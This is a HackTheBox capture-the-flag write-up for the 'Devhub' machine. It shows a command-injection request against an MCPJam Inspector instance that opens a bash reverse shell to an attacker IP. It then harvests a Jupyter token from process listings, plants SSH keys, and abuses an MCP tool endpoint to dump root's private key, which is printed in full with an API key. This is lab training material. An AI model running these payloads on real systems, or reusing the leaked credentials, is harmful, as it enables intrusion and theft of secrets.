---
title: Devhub
machine: Devhub
date: 2026-06-01
category: [HackTheBox, Linux]
platform: HackTheBox
os: Linux
tags: [nmap, linPEAS, Wireshark]
difficulty: Medium
summary: Devhub is a medium rated box on Hack The Box
machine_url: https://app.hackthebox.com/machines/DevHub
achievement: https://labs.hackthebox.com/achievement/machine/1737280/903
---

# Reconnaissance
Nmap-scan:
```bash
# Nmap 7.99 scan initiated Sun May 31 15:46:17 2026 as: /usr/lib/nmap/nmap --privileged -sVC -vv -p- -T4 -oN nmap-full 10.129.43.217
Nmap scan report for 10.129.43.217
Host is up, received echo-reply ttl 63 (0.18s latency).
Scanned at 2026-05-31 15:46:19 +07 for 302s
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPWeIVAL8xAfqZkJzRocGOpKCgXQk807PgJQqBcvDCiTcyFYlXvFY0v+sI1XXnYKghVRDkCxYy23sjlFMceuifE=
|   256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAWDVyu6UXTR8XbXiFXOJx0xwUVCRheT9hT20o1VbEht
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
6274/tcp open  unknown syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Sun, 31 May 2026 08:51:06 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Sun, 31 May 2026 08:51:06 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6274-TCP:V=7.99%I=7%D=5/31%Time=6A1BF67A%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,290,"HTTP/1\.1\x20200\x20OK\r\naccess-control-allow-credential
SF:s:\x20true\r\ncontent-length:\x20466\r\ncontent-type:\x20text/html;\x20
SF:charset=utf-8\r\nvary:\x20Origin\r\nDate:\x20Sun,\x2031\x20May\x202026\
SF:x2008:51:06\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<
SF:html\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=
SF:\"UTF-8\"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20type=\"image/
SF:svg\+xml\"\x20href=\"/mcp_jam\.svg\"\x20/>\n\x20\x20\x20\x20<meta\x20na
SF:me=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\
SF:"\x20/>\n\x20\x20\x20\x20<title>MCPJam\x20Inspector</title>\n\x20\x20\x
SF:20\x20<script\x20type=\"module\"\x20crossorigin\x20src=\"/assets/index-
SF:DRYhT9Xb\.js\"></script>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20crossorigin\x20href=\"/assets/index-XvFRNbCs\.css\">\n\x20\x20</head>
SF:\n\x20\x20<body>\n\x20\x20\x20\x20<div\x20id=\"root\"></div>\n\x20\x20<
SF:/body>\n</html>\n")%r(HTTPOptions,F0,"HTTP/1\.1\x20204\x20No\x20Content
SF:\r\naccess-control-allow-credentials:\x20true\r\naccess-control-allow-m
SF:ethods:\x20GET,HEAD,PUT,POST,DELETE,PATCH\r\nvary:\x20Origin\r\ncontent
SF:-type:\x20text/plain;\x20charset=UTF-8\r\nDate:\x20Sun,\x2031\x20May\x2
SF:02026\x2008:51:06\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPReques
SF:t,F0,"HTTP/1\.1\x20204\x20No\x20Content\r\naccess-control-allow-credent
SF:ials:\x20true\r\naccess-control-allow-methods:\x20GET,HEAD,PUT,POST,DEL
SF:ETE,PATCH\r\nvary:\x20Origin\r\ncontent-type:\x20text/plain;\x20charset
SF:=UTF-8\r\nDate:\x20Sun,\x2031\x20May\x202026\x2008:51:06\x20GMT\r\nConn
SF:ection:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSS
SF:tatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConn
SF:ection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 31 15:51:21 2026 -- 1 IP address (1 host up) scanned in 303.68 seconds
```
- Port 80: `devhub.htb`
- Port 6274: MCPJam Inspector v1.4.2 -> CVE-2026-23744
Exploiting the vulnerable MCP Jam Inspector instance:
```bash
curl -k http://devhub.htb:6274/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"/bin/bash\",\"args\":[\"-c\",\"bash -i >& /dev/tcp/10.10.14.105/44444 0>&1\"],\"env\":{}},\"serverId\":\"mytest\"}"
```
To trigger revshell as `mcp-dev`
Go to `mcp-dev's` home directory, generate/ drop a public key in .ssh/authorized_keys to ssh as `mcp-dev` and forward the two service in loopback interface (8888 and 5000) to my machine.
- Port 8888 is a Jupyter server.
```bash
ps aux | grep analyst
analyst     1048  0.1  2.4 183068 97676 ?        Ss   01:23   0:07 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
root        1054  0.0  0.7 111108 28972 ?        Ss   01:23   0:02 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
mcp-dev    58479  0.0  0.0   6612  2268 pts/0    S+   03:15   0:00 grep --color=auto analyst
```
`ps` shows the command that is used to run the jupyter-server and also leak the server token that can be used to authenticate.
Then access the console on the jupyter server as `analyst`.
Can inject the public key into .ssh/authorized_keys for stable ssh session.
Check the /opt/opsmcp/server.py reveals the endpoints to get root's ssh private key:
```bash
curl -X POST -k http://localhost:5000/tools/call -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -H "Content-Type: application/json" -d '{"name": "ops._admin_dump", "arguments" : {"confirm": "True", "target": "ssh_keys"}}'
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
```